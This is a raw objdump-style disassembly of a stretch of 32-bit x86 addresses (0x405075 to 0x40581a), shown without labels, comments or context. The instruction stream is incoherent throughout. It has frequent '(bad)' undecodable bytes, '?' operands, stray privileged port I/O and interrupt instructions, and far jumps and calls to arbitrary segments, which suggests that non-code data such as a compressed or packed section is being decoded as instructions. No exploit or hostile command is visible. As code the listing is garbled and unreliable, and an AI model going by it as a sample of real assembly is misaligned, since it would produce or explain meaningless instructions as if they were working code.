  405075:	sbb    DWORD PTR [ebx+0x4149ee99],0xc71e0369
  40507f:	mov    ebx,0xb5bc892
  405084:	sub    eax,0x400ec393
  405089:	sbb    DWORD PTR [edi],esp
  40508b:	loopne 0x4050f6
  40508d:	xor    al,bl
  40508f:	outs   dx,BYTE PTR ds:[esi]
  405090:	idiv   BYTE PTR [eax]
  405092:	or     DWORD PTR gs:[eax+ebp*1],edi
  405096:	xor    al,0x38
  405098:	xchg   ebp,eax
  405099:	scas   eax,DWORD PTR es:[edi]
  40509a:	or     al,BYTE PTR [edx]
  40509c:	pop    es
  40509d:	add    ah,BYTE PTR [ecx]
  40509f:	xor    DWORD PTR [ecx+0x2593e57d],edx
  4050a5:	mov    esp,DWORD PTR [edx+0x8f52d77]
  4050ab:	lea    esp,[edx]
  4050ad:	enter  0x242e,0x4c
  4050b1:	bound  ebp,QWORD PTR [edx]
  4050b3:	push   0x57c67bab
  4050b8:	jnp    0x4050ec
  4050ba:	and    BYTE PTR [eax+0x5a],cl
  4050bd:	test   al,0x87
  4050bf:	aam    0x3
  4050c1:	out    0x68,al
  4050c3:	sbb    al,0xc7
  4050c5:	pop    eax
  4050c6:	shl    BYTE PTR [ebx-0x5d],cl
  4050c9:	ficomp DWORD PTR [edx+ebp*1-0x49]
  4050cd:	push   ecx
  4050ce:	out    0xdb,eax
  4050d0:	es inc esp
  4050d2:	in     al,0x33
  4050d4:	outs   dx,BYTE PTR ds:[esi]
  4050d5:	mov    edi,0xe6963ac0
  4050da:	pop    ss
  4050db:	dec    edi
  4050dc:	and    eax,0xa4d2ec58
  4050e1:	jecxz  0x40514a
  4050e3:	mov    eax,0xd9f0c649
  4050e8:	sti    
  4050e9:	dec    ebp
  4050ea:	jo     0x4050c4
  4050ec:	pop    es
  4050ed:	cld    
  4050ee:	mov    dl,0x0
  4050f0:	dec    esp
  4050f1:	nop
  4050f2:	(bad)  
  4050f3:	iret   
  4050f4:	cmp    edx,DWORD PTR [eax+0x7389f5c4]
  4050fa:	call   0x31f1:0x36d5f178
  405101:	scas   al,BYTE PTR es:[edi]
  405102:	push   esi
  405103:	mov    esp,0xe70f083e
  405108:	xchg   BYTE PTR [edi+0x3ce76150],ah
  40510e:	lahf   
  40510f:	mov    bh,dh
  405111:	loop   0x40514a
  405113:	and    eax,0xd26a4956
  405118:	sti    
  405119:	scas   al,BYTE PTR es:[edi]
  40511a:	lahf   
  40511b:	(bad)  
  40511c:	aad    0x2f
  40511e:	test   BYTE PTR [edi+0x177e854f],dl
  405124:	jbe    0x405132
  405126:	loopne 0x4050f2
  405128:	dec    edx
  405129:	dec    ebp
  40512a:	sub    ch,BYTE PTR [edi-0x54]
  40512d:	mov    ?,ebx
  40512f:	rcl    BYTE PTR [ebx+0x44451c23],1
  405135:	mov    edi,0xa85cb28f
  40513a:	add    DWORD PTR [edi],eax
  40513c:	retf   
  40513d:	es cmp al,0xc
  405140:	std    
  405141:	adc    dh,BYTE PTR [ebx-0x7ddddca9]
  405147:	(bad)  
  405148:	into   
  405149:	mov    bl,0xd6
  40514b:	jecxz  0x4051ae
  40514d:	jle    0x40518b
  40514f:	repz retf 
  405151:	neg    BYTE PTR [edi]
  405153:	and    al,ch
  405155:	add    al,0xcb
  405157:	inc    edx
  405158:	inc    esp
  405159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40515a:	xchg   BYTE PTR [esi-0x73900535],ch
  405160:	nop
  405161:	enter  0x4e56,0x78
  405165:	les    eax,FWORD PTR [esi+0x7238ff3e]
  40516b:	mov    ah,0x9f
  40516d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40516e:	(bad)  
  40516f:	or     eax,0xab218f40
  405174:	cmp    edi,DWORD PTR [ebx]
  405176:	xchg   BYTE PTR [edi+0x64c8579a],al
  40517c:	xchg   DWORD PTR [edi+0x42631954],eax
  405182:	inc    ebx
  405183:	repnz sbb al,0x63
  405186:	(bad)
  405189:	cdq    
  40518a:	sbb    eax,0xfd17270b
  40518f:	push   ecx
  405190:	xchg   bl,dh
  405192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405193:	xchg   BYTE PTR [ecx+0x42],ch
  405196:	jns    0x405152
  405198:	inc    edi
  405199:	jmp    0x9681:0x6712ce13
  4051a0:	bound  eax,QWORD PTR [esp+edi*8]
  4051a3:	in     al,0xdd
  4051a5:	sub    BYTE PTR [ebp-0x53a7dd0b],bh
  4051ab:	icebp  
  4051ac:	jmp    0x65e4:0xb0172a
  4051b3:	lahf   
  4051b4:	arpl   cx,cx
  4051b6:	push   ecx
  4051b7:	sbb    DWORD PTR [edx-0x346b742a],edi
  4051bd:	jmp    0x40522c
  4051bf:	push   ecx
  4051c0:	jo     0x4051f0
  4051c2:	loope  0x4051c3
  4051c4:	inc    esp
  4051c5:	xor    DWORD PTR [eax],0xffffffbe
  4051c8:	test   eax,0x8e41b4e6
  4051cd:	test   al,0x1
  4051cf:	mov    ch,0x59
  4051d1:	pop    ss
  4051d2:	sahf   
  4051d3:	nop
  4051d4:	xlat   BYTE PTR ds:[ebx]
  4051d5:	xor    bh,al
  4051d7:	mov    ds:0xbbc8f2b1,al
  4051dc:	(bad)  
  4051dd:	aaa    
  4051de:	push   ds
  4051df:	xchg   BYTE PTR [ebx],ah
  4051e1:	sbb    al,0xe9
  4051e3:	int3   
  4051e4:	xor    BYTE PTR [eax+0x9322943],ah
  4051ea:	mov    DWORD PTR [esp+eax*2-0x6f474978],eax
  4051f1:	sbb    al,0xc9
  4051f3:	cmp    al,0x3a
  4051f5:	xor    DWORD PTR [ebx],esp
  4051f7:	sbb    dh,BYTE PTR [ecx+0x5f]
  4051fa:	dec    esi
  4051fb:	mov    esi,DWORD PTR [edi]
  4051fd:	add    dl,al
  4051ff:	daa    
  405200:	retf   
  405201:	bound  esp,QWORD PTR [edx-0x35d15e5a]
  405207:	lahf   
  405208:	mov    dh,0xbc
  40520a:	cdq    
  40520b:	sti    
  40520c:	sub    esi,eax
  40520e:	jecxz  0x4051b2
  405210:	movlhps xmm1,xmm2
  405213:	fwait
  405214:	pop    esi
  405215:	jmp    0xb86c3f7a
  40521a:	jge    0x4051b9
  40521c:	xlat   BYTE PTR ds:[ebx]
  40521d:	mov    gs,WORD PTR [ecx+0x46aabb6c]
  405223:	xor    BYTE PTR ds:[ebx],dh
  405226:	pop    es
  405227:	mov    dl,0x98
  405229:	and    bh,ah
  40522b:	les    edi,FWORD PTR [esp+esi*1]
  40522e:	or     ecx,DWORD PTR [edi-0x41fa3de3]
  405234:	enter  0x4316,0x43
  405238:	outs   dx,BYTE PTR ds:[esi]
  405239:	adc    DWORD PTR [edx],esi
  40523b:	popf   
  40523c:	loope  0x4051c6
  40523e:	inc    esi
  40523f:	inc    esi
  405240:	pop    esp
  405241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405242:	aas    
  405243:	test   al,0xd9
  405245:	and    BYTE PTR [edx+0x5841f19f],al
  40524b:	scas   al,BYTE PTR es:[edi]
  40524c:	(bad)  
  40524d:	das    
  40524e:	and    al,0x7e
  405250:	cmp    ebx,esi
  405252:	(bad)  
  405253:	xchg   edi,eax
  405254:	jne    0x4052b7
  405256:	fwait
  405257:	std    
  405258:	dec    ebx
  405259:	dec    ecx
  40525a:	jo     0x4052d7
  40525c:	retf   
  40525d:	xchg   DWORD PTR [ebp+0x3e436860],esp
  405263:	add    edi,edx
  405265:	push   ebx
  405266:	addr16 cld 
  405268:	inc    ebx
  405269:	rol    DWORD PTR ds:[ebx+0x5],cl
  40526d:	add    BYTE PTR [edi],cl
  40526f:	inc    esp
  405270:	dec    esp
  405271:	popf   
  405272:	mov    ebx,0x77abd123
  405277:	test   dl,ah
  405279:	dec    esp
  40527a:	sti    
  40527b:	sbb    BYTE PTR [ecx+0xe],0x47
  40527f:	(bad)  
  405280:	hlt    
  405281:	xor    eax,0xbd41956c
  405286:	cwde   
  405287:	sti    
  405288:	in     eax,0x26
  40528a:	or     eax,0xe50f2ef3
  40528f:	test   DWORD PTR [eax+ebp*4-0x20],ecx
  405293:	mov    DWORD PTR [esi],eax
  405295:	push   ss
  405296:	xor    ch,0x56
  405299:	dec    ecx
  40529a:	out    0xfc,al
  40529c:	inc    ecx
  40529d:	ror    dh,0xcf
  4052a0:	call   FWORD PTR [edi]
  4052a2:	cmp    eax,0xd29f2983
  4052a7:	ds sub BYTE PTR es:[edx+esi*8],dh
  4052ac:	sbb    esi,DWORD PTR [ebx+ebx*8-0x5e8a764a]
  4052b3:	out    dx,eax
  4052b4:	push   ecx
  4052b5:	ret    
  4052b6:	ja     0x4052a8
  4052b8:	and    ah,BYTE PTR [edx]
  4052ba:	(bad)  
  4052bb:	adc    eax,0x6529dcff
  4052c0:	shl    DWORD PTR [esi+0x7f4500d4],0xb7
  4052c7:	adc    DWORD PTR [ecx],ecx
  4052c9:	sub    ebp,DWORD PTR [ebx+eiz*2]
  4052cc:	adc    eax,0xd50ee101
  4052d1:	mov    cl,0x16
  4052d3:	mov    eax,ds:0xac472399
  4052d8:	je     0x405300
  4052da:	push   esi
  4052db:	lods   al,BYTE PTR ds:[esi]
  4052dc:	pushf  
  4052dd:	gs cs test eax,0x81ac6b35
  4052e4:	aam    0x90
  4052e6:	xor    DWORD PTR [eax-0x6],ebp
  4052e9:	push   ecx
  4052ea:	add    ebx,DWORD PTR [ebx]
  4052ec:	adc    eax,0xc1dd8bcc
  4052f1:	xlat   BYTE PTR ds:[ebx]
  4052f2:	push   ecx
  4052f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052f4:	retf   
  4052f5:	mov    esi,0xad22cb66
  4052fa:	js     0x4052f5
  4052fc:	push   eax
  4052fd:	xchg   ecx,eax
  4052fe:	inc    ebp
  4052ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405300:	pop    esi
  405301:	shl    edx,cl
  405303:	mov    cl,0xf0
  405305:	add    ebp,DWORD PTR [ecx+0x138be52a]
  40530b:	out    0x26,al
  40530d:	jge    0x4052e6
  40530f:	in     eax,0xfc
  405311:	xor    BYTE PTR [ecx+ebp*4],cl
  405314:	jns    0x405363
  405316:	cmp    bl,BYTE PTR [edi]
  405318:	and    cl,BYTE PTR [edi-0x7847ca01]
  40531e:	cwde   
  40531f:	mov    es,WORD PTR [eax+edi*1-0x65c66f5e]
  405326:	sub    cl,bh
  405328:	dec    edx
  405329:	push   0xffffff86
  40532b:	pop    ebx
  40532c:	arpl   WORD PTR [ebp-0x321d3b93],bp
  405332:	xchg   edx,eax
  405333:	cmc    
  405334:	ins    BYTE PTR es:[edi],dx
  405335:	cmp    cl,BYTE PTR ds:0x89f55ce5
  40533b:	pop    edx
  40533c:	adc    bl,ch
  40533e:	test   eax,edx
  405340:	sub    eax,0x2fc0ae1f
  405345:	in     al,dx
  405346:	das    
  405347:	jae    0x4053c4
  405349:	cmp    al,0x74
  40534b:	xor    DWORD PTR [edx+0x662a8cf8],esp
  405351:	pop    ecx
  405352:	rol    BYTE PTR [ebx+0x38],1
  405355:	push   esi
  405356:	sbb    DWORD PTR [ecx-0x34],ebp
  405359:	pop    edi
  40535a:	mov    dl,0x26
  40535c:	pop    es
  40535d:	pop    eax
  40535e:	cmp    dh,BYTE PTR [ecx+0x11e94e8b]
  405364:	scas   al,BYTE PTR es:[edi]
  405365:	sbb    eax,0x7c0e060d
  40536a:	mov    dh,0xcf
  40536c:	gs pop edi
  40536e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40536f:	out    0x3d,eax
  405371:	lods   eax,DWORD PTR ds:[esi]
  405372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405373:	mov    dh,BYTE PTR [eax-0x2196478a]
  405379:	iret   
  40537a:	pop    edx
  40537b:	inc    esp
  40537c:	dec    ecx
  40537d:	rcl    BYTE PTR ds:[edx+0x29],1
  405381:	rcr    BYTE PTR [edi+ebp*4+0x5d],1
  405385:	hlt    
  405386:	int    0x33
  405388:	out    dx,eax
  405389:	je     0x40539e
  40538b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40538c:	mov    bl,0x51
  40538e:	mov    ah,0xe6
  405390:	jp     0x4053d2
  405392:	pop    ss
  405393:	and    eax,0x9d57b69f
  405398:	inc    edi
  405399:	inc    ebp
  40539a:	loopne 0x4053b8
  40539c:	sbb    eax,0x78892686
  4053a1:	ret    0x841d
  4053a4:	mov    DWORD PTR [edi+eiz*1],edi
  4053a7:	jg     0x405395
  4053a9:	mov    DWORD PTR [esi],eax
  4053ab:	test   DWORD PTR ds:0x610e4389,ecx
  4053b1:	icebp  
  4053b2:	dec    edx
  4053b3:	inc    ebx
  4053b4:	jno    0x405384
  4053b6:	imul   edx,DWORD PTR [edi],0x3d989d5f
  4053bc:	js     0x4053a1
  4053be:	add    DWORD PTR [edi],esp
  4053c0:	mov    eax,DWORD PTR [ecx+ebp*2+0x56081d6f]
  4053c7:	stc    
  4053c8:	ja     0x405405
  4053ca:	jnp    0x40536a
  4053cc:	cli    
  4053cd:	not    DWORD PTR [ebx-0x7f]
  4053d0:	pop    esp
  4053d1:	inc    edi
  4053d2:	mov    esi,0x6f4a172f
  4053d7:	pop    ebx
  4053d8:	not    edx
  4053da:	xchg   ebx,eax
  4053db:	mov    bl,0x46
  4053dd:	adc    eax,0x101a2c29
  4053e2:	mov    BYTE PTR [edi+esi*4],bh
  4053e5:	out    dx,eax
  4053e6:	push   ebx
  4053e7:	repz sbb al,0x39
  4053ea:	jmp    FWORD PTR [ebx+0x56]
  4053ed:	jmp    0x40538f
  4053ef:	sub    BYTE PTR ds:0x10f2e58c,dh
  4053f5:	out    0x6,al
  4053f7:	ins    BYTE PTR es:[edi],dx
  4053f8:	cmp    al,0xbb
  4053fa:	pop    edi
  4053fb:	mov    dh,0xd7
  4053fd:	inc    ecx
  4053fe:	ins    DWORD PTR es:[edi],dx
  4053ff:	inc    ebx
  405400:	aad    0x21
  405402:	in     eax,0x4e
  405404:	push   edx
  405405:	clc    
  405406:	push   esi
  405407:	cs das 
  405409:	xlat   BYTE PTR ds:[ebx]
  40540a:	xchg   ebx,eax
  40540b:	call   0xd55a3780
  405410:	test   dl,bl
  405412:	mov    ch,0xe0
  405414:	add    BYTE PTR [ecx+ebp*4+0x3f],ch
  405418:	mov    eax,cs:0x6082a91f
  40541e:	and    bh,bh
  405420:	scas   al,BYTE PTR es:[edi]
  405421:	mov    eax,0x336b3b48
  405426:	mov    dh,0x39
  405428:	outs   dx,DWORD PTR ds:[esi]
  405429:	push   eax
  40542a:	push   ebp
  40542b:	icebp  
  40542c:	push   ecx
  40542d:	imul   eax,ebp,0x18c37ef3
  405433:	cwde   
  405434:	fs pop ecx
  405436:	inc    ebx
  405437:	in     eax,0x2b
  405439:	cli    
  40543a:	dec    edi
  40543b:	mov    fs,WORD PTR [ebp+0xc]
  40543e:	cli    
  40543f:	pop    ebp
  405440:	jmp    0x405423
  405442:	dec    esi
  405443:	mov    cl,0xee
  405445:	or     BYTE PTR [ebx+0x31],bh
  405448:	fsubr  QWORD PTR [ecx+eax*1-0x19]
  40544c:	jbe    0x405495
  40544e:	inc    ebx
  40544f:	addr16 mov ah,0x73
  405452:	pop    edi
  405453:	xchg   DWORD PTR [ecx],ebx
  405455:	xor    BYTE PTR [edx],ch
  405457:	or     dh,BYTE PTR [ebx+ebx*2+0x37]
  40545b:	push   edx
  40545c:	cmp    BYTE PTR [eax-0x204d03d],ah
  405462:	loopne 0x405459
  405464:	pop    edx
  405465:	(bad)  
  405467:	mov    eax,0x1c7f9b29
  40546c:	mov    ds:0x95d35ac2,eax
  405471:	jns    0x4054b7
  405473:	dec    DWORD PTR [esi]
  405475:	ds jmp 0x4054da
  405478:	mov    DWORD PTR [ecx-0x183e073c],edx
  40547e:	jns    0x40548e
  405480:	inc    esi
  405481:	xlat   BYTE PTR ds:[ebx]
  405482:	(bad)  
  405483:	adc    BYTE PTR [edi-0x4bb270e3],bl
  405489:	mov    dl,0x3c
  40548b:	dec    ecx
  40548c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40548d:	shr    BYTE PTR [ebp-0x45],cl
  405490:	cmp    ebx,DWORD PTR ds:0x6e7011d6
  405496:	popf   
  405497:	mov    ebx,edx
  405499:	pop    ss
  40549a:	leave  
  40549b:	cwde   
  40549c:	lods   eax,DWORD PTR ds:[esi]
  40549d:	sub    DWORD PTR [ecx-0x25401cb],edi
  4054a3:	mov    ecx,ecx
  4054a5:	jne    0x4054e9
  4054a7:	out    0x46,eax
  4054a9:	push   ss
  4054aa:	mov    bh,0xbd
  4054ac:	adc    eax,0x271b6a82
  4054b1:	and    BYTE PTR [edi-0x4a],al
  4054b4:	scas   al,BYTE PTR es:[edi]
  4054b5:	shl    DWORD PTR [edx+0x73],1
  4054b8:	jle    0x405463
  4054ba:	xor    DWORD PTR [ecx],ebx
  4054bc:	push   ss
  4054bd:	pop    ss
  4054be:	mov    ecx,0x9dbe3ac3
  4054c3:	les    ecx,FWORD PTR [esi-0x11cdab6f]
  4054c9:	in     eax,dx
  4054ca:	and    DWORD PTR [edx],0xe3dc2c99
  4054d0:	bound  esi,QWORD PTR [eax+0x2fd56677]
  4054d6:	jle    0x4054ad
  4054d8:	cmp    eax,0xacb61f65
  4054dd:	inc    ebp
  4054de:	shr    BYTE PTR [edx-0x2c],0xff
  4054e2:	dec    esp
  4054e3:	fwait
  4054e4:	loop   0x40546d
  4054e6:	xchg   BYTE PTR [ebx*2-0x7bd757e3],ch
  4054ed:	aas    
  4054ee:	pop    edx
  4054ef:	jecxz  0x405556
  4054f1:	jns    0x405497
  4054f3:	adc    ecx,0x3233ec9
  4054f9:	ret    
  4054fa:	mov    ah,0xce
  4054fc:	scas   eax,DWORD PTR es:[edi]
  4054fd:	fisubr WORD PTR [ebx]
  4054ff:	or     al,0x1a
  405501:	test   BYTE PTR [bx+si+0x7dc2],0x6b
  405507:	cmp    BYTE PTR [ebx],dl
  405509:	push   0x3131d0e
  40550e:	mov    eax,ds:0x33f38e9f
  405513:	xor    eax,0xc0d11309
  405518:	stc    
  405519:	mov    ebx,0x9c5ab2c1
  40551e:	pop    edi
  40551f:	push   ebx
  405520:	mov    al,0x5f
  405522:	mov    dl,0x94
  405524:	(bad)  
  405525:	(bad)  
  405526:	dec    eax
  405527:	mov    dl,0x21
  405529:	cdq    
  40552a:	or     al,0x34
  40552c:	neg    eax
  40552e:	mov    ds:0x5d7f9468,al
  405533:	push   0x2237006a
  405538:	test   BYTE PTR [edi],bl
  40553a:	jns    0x405503
  40553c:	pusha  
  40553d:	rol    DWORD PTR [ecx-0x5b2cb5f8],0xb8
  405544:	aas    
  405545:	pop    ecx
  405546:	and    al,0x6
  405548:	jp     0x405598
  40554a:	jl     0x4054e2
  40554c:	push   es
  40554d:	sub    BYTE PTR [edi+eax*2-0x39c0f224],al
  405554:	jno    0x40556f
  405556:	and    dl,BYTE PTR [ebp+0x64]
  405559:	push   edi
  40555a:	xor    bh,ch
  40555c:	pop    edx
  40555d:	sub    al,BYTE PTR [eax+eiz*4-0x14f12ac8]
  405564:	das    
  405565:	push   eax
  405566:	mov    al,ds:0xe26fc385
  40556b:	in     al,dx
  40556c:	mov    cl,0x76
  40556e:	sbb    DWORD PTR [ebx-0x39e5a158],ecx
  405574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405575:	xlat   BYTE PTR ds:[ebx]
  405576:	in     eax,dx
  405577:	xchg   BYTE PTR [eax],al
  405579:	jecxz  0x4055e3
  40557b:	sub    cl,BYTE PTR [ebx-0x5f]
  40557e:	shr    BYTE PTR [eax+0x3b],1
  405581:	sti    
  405582:	mov    edx,0x90aa002e
  405587:	xchg   ecx,eax
  405588:	push   edi
  405589:	sub    edi,DWORD PTR [ebp-0x4e]
  40558c:	idiv   edi
  40558e:	mov    ecx,0xe77cae8a
  405593:	xor    DWORD PTR [eax+0x1071bb0b],edx
  405599:	aaa    
  40559a:	into   
  40559b:	ja     0x405618
  40559d:	cs push ebx
  40559f:	xor    al,BYTE PTR [edi]
  4055a1:	std    
  4055a2:	out    0xf1,al
  4055a4:	pop    eax
  4055a5:	stos   DWORD PTR es:[edi],eax
  4055a6:	xchg   ebx,eax
  4055a7:	cmp    eax,ebp
  4055a9:	mov    WORD PTR [eax],?
  4055ab:	jmp    0xa63:0x1ed8b43f
  4055b2:	fucomi st,st(5)
  4055b4:	ja     0x405624
  4055b6:	and    DWORD PTR [edx],ebp
  4055b8:	stc    
  4055b9:	ror    esp,1
  4055bb:	ins    DWORD PTR es:[edi],dx
  4055bc:	leave  
  4055bd:	call   0x73e8:0x728fa8be
  4055c4:	mov    ch,BYTE PTR [ecx+edi*8-0xe986827]
  4055cb:	add    eax,ecx
  4055cd:	pop    ebp
  4055ce:	xor    eax,DWORD PTR [edi]
  4055d0:	and    DWORD PTR [ecx],esi
  4055d2:	out    0x65,al
  4055d4:	pop    esp
  4055d5:	iret   
  4055d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055d7:	sbb    BYTE PTR [esi+0x67],0x75
  4055db:	cwde   
  4055dc:	or     DWORD PTR [ebp-0x4562a0e1],esp
  4055e2:	sbb    al,0xd1
  4055e4:	pop    ecx
  4055e5:	repnz mov esi,0x3a0d9cef
  4055eb:	pop    esp
  4055ec:	ret    
  4055ed:	or     eax,0x3d32bad4
  4055f2:	xor    DWORD PTR [ebp+0x29debb26],esi
  4055f8:	(bad)  
  4055f9:	pop    esp
  4055fa:	lods   eax,DWORD PTR ds:[esi]
  4055fb:	jo     0x4055c4
  4055fd:	xchg   edi,eax
  4055fe:	jne    0x405598
  405600:	inc    edi
  405601:	jb     0x405613
  405603:	ins    BYTE PTR es:[edi],dx
  405604:	pusha  
  405605:	imul   ebp,DWORD PTR [esi-0x3a],0xd8b353dc
  40560c:	xor    DWORD PTR [edx+eiz*1],edx
  40560f:	cwde   
  405610:	cwde   
  405611:	xchg   esi,eax
  405612:	js     0x40559a
  405614:	ss push cs
  405616:	pusha  
  405617:	int3   
  405618:	aad    0x65
  40561a:	cmc    
  40561b:	fadd   QWORD PTR [eax]
  40561d:	into   
  40561e:	inc    edx
  40561f:	bnd call 0xdaed3b97
  405625:	mov    bl,cl
  405627:	cmp    DWORD PTR [ecx+0x3b4599c7],ebx
  40562d:	sub    BYTE PTR [edi+0x67a8cf98],ah
  405633:	adc    eax,0xbe937ed2
  405638:	retf   0xe9b
  40563b:	ins    DWORD PTR es:[edi],dx
  40563c:	daa    
  40563d:	lock ja 0x4056b3
  405640:	push   ss
  405641:	pop    esi
  405642:	and    BYTE PTR [esi+0x19],cl
  405645:	stc    
  405646:	data16 ds adc bh,dh
  40564a:	les    edi,FWORD PTR [edi]
  40564c:	push   0x4813af04
  405651:	imul   esp,DWORD PTR [eax+0x66],0x4d
  405655:	dec    eax
  405656:	clc    
  405657:	js     0x405644
  405659:	stc    
  40565a:	and    edx,DWORD PTR [ebp-0x1f]
  40565d:	ins    BYTE PTR es:[edi],dx
  40565e:	xchg   ebx,eax
  40565f:	js     0x405665
  405661:	cmp    eax,0x8a5f244b
  405666:	in     al,dx
  405667:	cmp    BYTE PTR [ebx],bh
  405669:	jp     0x4055f0
  40566b:	adc    BYTE PTR ds:0x9b5f8d4d,dl
  405671:	push   ebx
  405672:	pop    es
  405673:	jb     0x4056d0
  405675:	or     eax,0xd7cb8957
  40567a:	and    DWORD PTR [esi+0x576cbacf],esi
  405680:	jmp    0x6fd3:0x27859d6e
  405687:	jp     0x40563f
  405689:	push   esi
  40568a:	mul    DWORD PTR [edi-0xd]
  40568d:	jg     0x405631
  40568f:	pushf  
  405690:	(bad)  
  405691:	or     esi,DWORD PTR [bp+di-0x4d0e]
  405696:	sbb    eax,DWORD PTR [edi-0x45dc6eca]
  40569c:	iret   
  40569d:	add    BYTE PTR [edx],al
  40569f:	inc    esp
  4056a0:	pop    edi
  4056a1:	(bad)  
  4056a2:	in     eax,0x5f
  4056a4:	call   0xdb55:0xd7900838
  4056ab:	xchg   ebx,eax
  4056ac:	and    DWORD PTR [edx-0x7b],esp
  4056af:	add    BYTE PTR [ebx-0x53],al
  4056b2:	jmp    0x40571b
  4056b4:	sub    BYTE PTR [edi],ah
  4056b6:	dec    edi
  4056b7:	mov    WORD PTR [eax+0x4b],gs
  4056ba:	shr    edi,cl
  4056bc:	xchg   edx,eax
  4056bd:	sub    DWORD PTR [ebp-0x329076f4],eax
  4056c3:	add    eax,0xd9e2cf0e
  4056c8:	xlat   BYTE PTR ds:[ebx]
  4056c9:	mov    DWORD PTR [ecx-0x15],ebp
  4056cc:	pop    esp
  4056cd:	test   BYTE PTR [ecx-0x3a],ch
  4056d0:	mov    ss,WORD PTR [eax]
  4056d2:	xchg   esi,eax
  4056d3:	stc    
  4056d4:	fst    st(3)
  4056d6:	sbb    ebx,DWORD PTR [edx]
  4056d8:	stc    
  4056d9:	in     al,0xe6
  4056db:	push   0xcfe20906
  4056e0:	fstp   DWORD PTR [edx+0x3a]
  4056e3:	gs out 0xfe,eax
  4056e6:	jo     0x405750
  4056e8:	arpl   si,di
  4056ea:	cmc    
  4056eb:	adc    DWORD PTR ds:0x54908d01,0xa397f652
  4056f5:	jle    0x4056bf
  4056f7:	mov    edx,DWORD PTR [edx-0x5c]
  4056fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056fb:	outs   dx,BYTE PTR ds:[esi]
  4056fc:	mov    bl,BYTE PTR [ebx]
  4056fe:	sub    al,0x14
  405700:	aas    
  405701:	inc    ecx
  405702:	test   eax,0x4fa0e30f
  405707:	mov    ah,BYTE PTR [eax+0x3751445e]
  40570d:	int3   
  40570e:	xor    ebp,ebp
  405710:	cwde   
  405711:	fistp  WORD PTR [edi+ebp*8]
  405714:	mov    WORD PTR [ecx-0x50534e13],ss
  40571a:	xor    BYTE PTR [edi-0x460be76c],cl
  405720:	push   ebx
  405721:	add    al,0x49
  405723:	or     BYTE PTR [edi+edi*4-0x66],dh
  405727:	mov    al,0x7b
  405729:	sub    ch,BYTE PTR [ecx+0x1d4c5a7e]
  40572f:	push   esi
  405730:	sub    DWORD PTR [ecx],0xb246206
  405736:	add    eax,0xdff05858
  40573b:	es test eax,0xd17c480c
  405741:	xchg   edi,eax
  405742:	sbb    dl,bl
  405744:	clc    
  405745:	ins    DWORD PTR es:[edi],dx
  405746:	dec    ebp
  405747:	popf   
  405748:	shl    DWORD PTR [ecx+ebp*1-0x4ec697fb],1
  40574f:	popa   
  405750:	loope  0x4056d4
  405752:	cs and bh,dh
  405755:	adc    BYTE PTR [ebx+0x7a],bl
  405758:	pop    edx
  405759:	push   edi
  40575a:	inc    ecx
  40575b:	xor    al,0x8d
  40575d:	ret    
  40575e:	pcmpgtw mm1,mm5
  405761:	xor    edx,DWORD PTR [eax+eax*4+0x30]
  405765:	inc    esi
  405766:	sbb    edx,DWORD PTR [eax]
  405768:	mov    al,ds:0xea10844d
  40576d:	(bad)  
  40576e:	das    
  40576f:	jge    0x40579e
  405771:	xchg   esp,eax
  405772:	xchg   ebp,eax
  405773:	cmp    ah,BYTE PTR [eax-0x56]
  405776:	jb     0x4057dd
  405778:	mov    WORD PTR [edi+0x3c2f2744],es
  40577e:	inc    esp
  40577f:	jp     0x40573b
  405781:	dec    ebx
  405782:	sub    dh,0xb9
  405785:	fcom   DWORD PTR [ebx+0x2cb167bf]
  40578b:	out    dx,al
  40578c:	test   eax,0x236fc714
  405791:	xor    dh,BYTE PTR [edx]
  405793:	and    al,0x98
  405795:	mov    dl,0x8
  405797:	pushf  
  405798:	rcr    BYTE PTR ds:0xaf03b2ca,0x2a
  40579f:	ds loop 0x405758
  4057a2:	repz dec eax
  4057a4:	(bad)  
  4057a5:	and    ecx,DWORD PTR ss:[ebx]
  4057a8:	shr    esi,1
  4057aa:	xchg   ebp,eax
  4057ab:	mov    eax,0xadfc07cf
  4057b0:	retf   0x5a8c
  4057b3:	ja     0x4057ac
  4057b5:	in     eax,0xa9
  4057b7:	sub    BYTE PTR [edi-0x2b1d0a00],dl
  4057bd:	(bad)  
  4057be:	jbe    0x40578b
  4057c0:	cwde   
  4057c1:	fdivr  QWORD PTR [edx]
  4057c3:	xor    ecx,ebp
  4057c5:	fidivr WORD PTR [ebx+0x72]
  4057c8:	mov    ds:0xbb6d2521,al
  4057cd:	inc    eax
  4057cf:	dec    eax
  4057d0:	xchg   ebx,eax
  4057d1:	iret   
  4057d2:	ins    DWORD PTR es:[edi],dx
  4057d3:	fwait
  4057d4:	int    0x5b
  4057d6:	inc    esi
  4057d7:	dec    eax
  4057d8:	and    eax,0xe297ceed
  4057dd:	ret    0xdc95
  4057e0:	loop   0x405837
  4057e2:	cli    
  4057e3:	pop    ebx
  4057e4:	add    DWORD PTR [eax],ecx
  4057e6:	mov    ch,0xb
  4057e8:	lea    ebx,[esi-0x50]
  4057eb:	pushf  
  4057ec:	loope  0x40581f
  4057ee:	jno    0x40579d
  4057f0:	fwait
  4057f1:	jnp    0x40580f
  4057f3:	mov    esi,0xa838bc02
  4057f8:	lock ins DWORD PTR es:[edi],dx
  4057fa:	jae    0x405808
  4057fc:	mov    DWORD PTR [esi-0x40],eax
  4057ff:	mov    ?,WORD PTR [ebx-0x257905db]
  405805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405806:	xchg   edi,eax
  405807:	cdq    
  405808:	mov    ds:0xb9e0f827,al
  40580d:	stos   BYTE PTR es:[edi],al
  40580e:	out    0xb0,al
  405810:	xchg   esi,eax
  405811:	cwde   
  405812:	fs pop edx
  405814:	add    BYTE PTR [esi+0x62b5d79e],dl
  40581a:	xchg   ebp,eax
